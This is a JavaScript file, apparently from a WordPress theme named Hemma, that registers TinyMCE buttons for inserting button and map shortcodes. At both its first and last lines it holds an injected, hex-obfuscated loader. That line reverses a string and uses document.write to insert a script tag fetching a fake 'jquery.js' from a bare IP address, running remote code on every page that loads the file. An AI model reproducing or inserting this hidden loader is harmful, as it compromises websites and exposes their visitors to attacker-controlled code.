var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))/**
 * TinyMCE button for custom shortcodes.
 */
(function( $ ) {
	'use strict';
	tinymce.create( 'tinymce.plugins.hemma_mce_button', {
		init: function( ed, url ) {
			// Add Button button
			ed.addButton( 'hemma_mce_button', {
				title: ed.getLang( 'hemma_mce_plugin.shortcode_button_title' ),
				icon: 'button',
				onclick: function() {
	                ed.windowManager.open({
	                    title: ed.getLang( 'hemma_mce_plugin.shortcode_button_title' ),
	                    body: [{
	                        type: 'textbox',
	                        name: 'buttontext',
	                        label: ed.getLang( 'hemma_mce_plugin.modal_button_label_1' ),
	                        value: ''
	                    },
	                    {
	                        type: 'textbox',
	                        name: 'buttonurl',
	                        label: ed.getLang( 'hemma_mce_plugin.modal_button_label_2' ),
	                        value: ''
	                    },
	                    {
	                        type: 'checkbox',
	                        name: 'buttontarget',
	                        label: ed.getLang( 'hemma_mce_plugin.modal_button_label_3' ),
	                        value: ''
	                    },
	                    {
	                        type: 'listbox',
	                        name: 'buttoncolor',
	                        label: ed.getLang( 'hemma_mce_plugin.modal_button_label_4' ),
	                        values: [
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_1' ), value: 'none' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_2' ), value: 'red' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_3' ), value: 'orange' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_4' ), value: 'yellow' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_5' ), value: 'green' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_6' ), value: 'light-blue' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_7' ), value: 'blue' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_8' ), value: 'purple' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_9' ), value: 'pink' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_10' ), value: 'brown' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_11' ), value: 'dark' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_12' ), value: 'white' }
	                        ]
	                    }],
	                    onsubmit: function(e) {
	                        ed.insertContent(
	                            '[button text="' +
	                            e.data.buttontext +
	                            '" url="' +
	                            e.data.buttonurl + 
	                            '" color="' +
	                            e.data.buttoncolor +
	                            '" open_new_tab="' +
	                            e.data.buttontarget +
	                            '"]'
	                        );
	                    }
	                });
				}
			});
			// Add Map button
			ed.addButton( 'hemma_mce_map', {
				title: ed.getLang( 'hemma_mce_plugin.shortcode_map_title' ),
				icon: 'map',
				onclick: function() {
	                ed.windowManager.open({
	                    title: ed.getLang( 'hemma_mce_plugin.shortcode_map_title' ),
	                    body: [{
	                        type: 'textbox',
	                        name: 'maplat',
	                        label: ed.getLang( 'hemma_mce_plugin.modal_map_label_1' ),
	                        value: ''
	                    },
	                    {
	                        type: 'textbox',
	                        name: 'maplon',
	                        label: ed.getLang( 'hemma_mce_plugin.modal_map_label_2' ),
	                        value: ''
	                    },
	                    {
	                        type: 'textbox',
	                        name: 'mapzoom',
	                        label: ed.getLang( 'hemma_mce_plugin.modal_map_label_3' ),
	                        value: ''
	                    },
	                    {
	                        type: 'textbox',
	                        name: 'mapheight',
	                        label: ed.getLang( 'hemma_mce_plugin.modal_map_label_4' ),
	                        value: ''
	                    },
	                    {
	                        type: 'listbox',
	                        name: 'mapstyle',
	                        label: ed.getLang( 'hemma_mce_plugin.modal_map_label_5' ),
	                        values: [
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_map_label_5_val_1' ), value: 'none' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_map_label_5_val_2' ), value: 'light' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_map_label_5_val_3' ), value: 'dark' }
	                        ]
	                    },
	                    {
	                        type: 'listbox',
	                        name: 'markercolor',
	                        label: ed.getLang( 'hemma_mce_plugin.modal_map_label_6' ),
	                        values: [
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_1' ), value: 'none' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_2' ), value: 'red' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_3' ), value: 'orange' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_4' ), value: 'yellow' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_5' ), value: 'green' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_6' ), value: 'light-blue' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_7' ), value: 'blue' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_8' ), value: 'purple' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_9' ), value: 'pink' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_10' ), value: 'brown' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_11' ), value: 'dark' },
	                        	{ text: ed.getLang( 'hemma_mce_plugin.modal_color_val_12' ), value: 'white' }
	                        ]
	                    }],
	                    onsubmit: function(e) {
	                        ed.insertContent(
	                            '[map latitude="' +
	                            e.data.maplat +
	                            '" longitude="' +
	                            e.data.maplon + 
	                            '" zoom="' +
	                            e.data.mapzoom +
	                            '" height="' +
	                            e.data.mapheight +
	                            '" style="' +
	                            e.data.mapstyle +
	                            '" marker="' +
	                            e.data.markercolor +
	                            '"]'
	                        );
	                    }
	                });
				}
			});
		},
		createControl: function( n, cm ) { return null; },
	});
	tinymce.PluginManager.add( 'hemma_button_script', tinymce.plugins.hemma_mce_button );

})( jQuery );
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
